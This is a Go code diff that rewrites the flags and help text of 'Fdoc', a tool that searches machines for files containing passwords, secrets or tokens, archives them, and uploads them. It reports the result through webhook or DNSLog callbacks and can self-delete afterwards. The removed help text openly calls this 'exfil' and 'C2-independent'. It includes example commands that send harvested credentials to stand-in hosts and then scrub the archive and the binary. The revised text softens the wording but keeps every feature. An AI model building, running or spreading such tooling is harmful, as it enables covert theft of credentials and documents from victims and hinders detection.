@@ -53,7 +53,7 @@ func (info *FlagInfo) InitFlag() {
 	info.applyDefaultSkipDirs()
 	info.checkDirectory(info.RootPath, "directory does not exist")
 	if !info.Size {
-		info.checkFileExistence(info.OutputPath, "output tar.gz already exists, choose another path")
+		info.checkFileExistence(info.OutputPath, "output archive already exists, choose another path")
 	}
 	info.logDebugInfo()
 }
@@ -80,34 +80,35 @@ func (info *FlagInfo) validateFlags() {
 		os.Exit(1)
 	}
 	if info.Scrub && !info.Upload {
-		logx.Error("-scrub requires -upload (cleanup runs only after successful upload+callback)")
+		logx.Error("-scrub requires -upload (cleanup runs only after successful upload)")
 		os.Exit(1)
 	}
-	if info.Upload {
-		if info.Webhook == "" && info.DNS == "" {
-			logx.Error("-upload requires -webhook and/or -dns for result callback")
-			os.Exit(1)
-		}
-		if info.Webhook != "" {
-			if err := validateWebhookURL(info.Webhook); err != nil {
-				logx.Error("%v", err)
-				os.Exit(1)
-			}
-		}
+	if info.Encrypt && !info.Upload {
+		logx.Error("-encrypt requires -upload")
+		os.Exit(1)
 	}
 	if info.Encrypt && info.EncryptKey == "" {
 		logx.Error("-encrypt requires -key")
 		os.Exit(1)
 	}
+	if info.Upload && info.Webhook != "" {
+		if err := validateWebhookURL(info.Webhook); err != nil {
+			logx.Error("%v", err)
+			os.Exit(1)
+		}
+	}
 	if info.CBTimeout <= 0 {
 		info.CBTimeout = 15 * time.Second
 	}
-	if info.Upload {
+	// task-id only needed when a remote callback channel is configured
+	if info.Upload && (info.Webhook != "" || info.DNS != "") {
 		if info.TaskID == "" {
 			info.TaskID = genTaskID()
+		} else {
+			info.TaskID = sanitizeTaskID(info.TaskID)
 		}
-		if sanitizeTaskID(info.TaskID) == "" {
-			logx.Error("invalid -task-id %q (need [a-z0-9-])", info.TaskID)
+		if info.TaskID == "" {
+			logx.Error("invalid -task-id (need [a-z0-9-])")
 			os.Exit(1)
 		}
 	}
@@ -145,8 +146,7 @@ func validateWebhookURL(raw string) error {
 	case "https":
 		return nil
 	case "http":
-		h := strings.ToLower(u.Hostname())
-		if h == "localhost" || h == "127.0.0.1" || h == "::1" {
+		if utils.IsLoopbackHost(u.Hostname()) {
 			return nil
 		}
 		return fmt.Errorf("-webhook must use https (http only allowed for loopback)")
@@ -158,81 +158,55 @@ func validateWebhookURL(raw string) error {
 // GetFlag registers and parses CLI flags.
 func (info *FlagInfo) GetFlag() {
 	flag.Usage = printUsage
-	flag.StringVar(&info.MaxSize, "max", "1GB", "max total logical size of matched files (cumulative; packing stops at limit and keeps archive)")
-	flag.StringVar(&info.MaxFileSize, "max-file", "100MB", "skip a single file larger than this logical size; 0 disables")
-	flag.StringVar(&info.OutputPath, "o", "", "output archive path")
-	flag.StringVar(&info.AfterDateStr, "t", "", "only include files modified on/after this date (local), e.g. 2023-10-01")
-	flag.StringVar(&info.RootPath, "d", "", "root path to scan (default: user home)")
-	flag.StringVar(&info.SkipDirs, "x", "", "comma-separated directories to skip (absolute or relative to -d)")
-	flag.StringVar(&info.FileName, "f", "", "fuzzy filename match (OR within list); AND with other filters. e.g. config,password")
-	flag.StringVar(&info.Keyword, "k", "", "content keyword match (OR within list); AND with other filters. e.g. password:,token:")
-	flag.StringVar(&info.Extension, "e", "documents", "extension filter (OR within list). presets: documents (default), all=common docs+archives+txt, archives|packages, images, videos, any=no ext filter")
-	flag.BoolVar(&info.Size, "size", false, "measure matched size only (disk + logical); does not pack. respects -max/-max-file")
-	flag.BoolVar(&info.Quiet, "q", false, "quiet mode")
-	flag.BoolVar(&info.Verbose, "v", false, "verbose mode, print matched file paths")
+	flag.StringVar(&info.MaxSize, "max", "1GB", "stop packing after this total size")
+	flag.StringVar(&info.MaxFileSize, "max-file", "100MB", "skip files larger than this (0=off)")
+	flag.StringVar(&info.OutputPath, "o", "", "output .tgz path")
+	flag.StringVar(&info.AfterDateStr, "t", "", "only files on/after date (YYYY-MM-DD)")
+	flag.StringVar(&info.RootPath, "d", "", "scan root (default: home)")
+	flag.StringVar(&info.SkipDirs, "x", "", "dirs to skip (comma-separated)")
+	flag.StringVar(&info.FileName, "f", "", "filename contains (comma = OR)")
+	flag.StringVar(&info.Keyword, "k", "", "file content contains (comma = OR)")
+	flag.StringVar(&info.Extension, "e", "documents", "ext filter: documents|all|any|pdf,txt,...")
+	flag.BoolVar(&info.Size, "size", false, "only measure size, do not pack")
+	flag.BoolVar(&info.Quiet, "q", false, "quiet")
+	flag.BoolVar(&info.Verbose, "v", false, "verbose")
 
-	flag.BoolVar(&info.Upload, "upload", false, "after packing, upload archive (auto backend by size) and callback")
-	flag.StringVar(&info.Backend, "b", "", "pin upload backend (default: auto probe+failover by archive size)")
-	flag.BoolVar(&info.Force, "force", false, "allow flaky/down upload backends")
-	flag.StringVar(&info.Webhook, "webhook", "", "HTTPS callback URL (POST JSON with download url)")
-	flag.StringVar(&info.DNS, "dns", "", "DNSLog / callback base domain for failover exfil")
-	flag.StringVar(&info.TaskID, "task-id", "", "task id in callback payload (auto-generated if empty)")
+	flag.BoolVar(&info.Upload, "upload", false, "upload archive after packing")
+	flag.StringVar(&info.Backend, "b", "", "upload backend (default: auto)")
+	flag.BoolVar(&info.Force, "force", false, "allow flaky upload backends")
+	flag.StringVar(&info.Webhook, "webhook", "", "HTTPS callback URL (optional)")
+	flag.StringVar(&info.DNS, "dns", "", "DNSLog domain for callback (optional)")
+	flag.StringVar(&info.TaskID, "task-id", "", "callback task id (auto if empty)")
 	var cbTimeoutSec float64
-	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "webhook timeout seconds")
-	flag.BoolVar(&info.Scrub, "scrub", false, "after successful upload+callback, delete archive and self binary")
-	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt archive stream before upload")
-	flag.StringVar(&info.EncryptKey, "key", "", "encryption key (required with -encrypt); not the same as -k keyword")
+	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "callback timeout seconds")
+	flag.BoolVar(&info.Scrub, "scrub", false, "delete archive + self after success")
+	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt before upload (needs -key)")
+	flag.StringVar(&info.EncryptKey, "key", "", "encrypt key (with -encrypt; not -k)")
 
 	flag.Parse()
 	info.CBTimeout = time.Duration(cbTimeoutSec * float64(time.Second))
 
 	if info.OutputPath == "" {
-		info.OutputPath = fmt.Sprintf("output_%s.tar.gz", time.Now().Format("20060102_150405"))
+		info.OutputPath = fmt.Sprintf("output_%s.tgz", time.Now().Format("20060102_150405"))
 	}
 }
 
 func printUsage() {
 	out := flag.CommandLine.Output()
-	fmt.Fprintf(out, `Fdoc - collect matching files into a tar.gz archive.
+	fmt.Fprintf(out, `Fdoc — find files and pack them into a .tgz
 
-Filters (-e/-f/-k/-t) combine with AND; comma-separated values inside one flag use OR.
-Defaults: -e documents, -max 1GB, -max-file 100MB, OS-specific skip dirs.
+  Fdoc -d /data -o out.tgz              pack documents under /data
+  Fdoc -d /data -size                   only show how big a pack would be
+  Fdoc -d /data -o out.tgz -upload -q   pack, upload, print download URL
+  Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
+  Fdoc decrypt -key SECRET -o out.tgz cipher.bin
 
-Common recipes:
-  1) Probe size first, then pack
-       Fdoc -d /data -e documents -size
-       Fdoc -d /data -e documents -max 500MB -o docs.tar.gz
-
-  2) Pack home docs quietly (default filters)
-       Fdoc -q -o docs.tar.gz
-
-  3) Find by name or content keywords
-       Fdoc -d C:\Users -f password,secret -e any -o hits.tar.gz
-       Fdoc -d /home -e txt,ini,conf -k token:,password: -o hits.tar.gz
-
-  4) Recent files only
-       Fdoc -d /data -e documents -t 2024-01-01 -o recent.tar.gz
-
-  5) Broader types / no ext filter
-       Fdoc -e all -size          # common docs+archives+txt (not every file)
-       Fdoc -e any -f config -max-file 0 -o cfg.tar.gz
-
-  6) Pack, auto-upload, callback (C2-independent)
-       Fdoc -d /data -e documents -o /tmp/x.tar.gz -upload \
-         -webhook https://your.host/hook -dns xxx.dnslog.cn -scrub -q
-
-Notes:
-  -size reports disk + logical; -max uses logical budget and keeps a partial archive.
-  Exit codes: 0=ok, 1=error, 2=truncated at -max.
-  -x replaces default skip dirs when set.
-  Inaccessible paths are skipped quietly; count is shown in the final summary (-v lists each).
-  -upload defaults to auto backend selection by archive size; -b pins a backend.
-  -webhook is an HTTPS URL that accepts POST JSON; -dns is a DNSLog base domain.
-  -scrub requires -upload; runs only after fully successful callback; omit it to keep local files.
-  -webhook must be https (http allowed only for loopback).
+Filters (-e/-f/-k/-t) are AND; comma lists inside one flag are OR.
+Default: -e documents, -max 1GB. Exit: 0 ok, 1 error, 2 hit -max (partial kept).
+Docs: README.md / README.zh-CN.md
 
 `)
-	fmt.Fprintf(out, "Usage of %s:\n", os.Args[0])
+	fmt.Fprintf(out, "Flags:\n")
 	flag.PrintDefaults()
 }
 
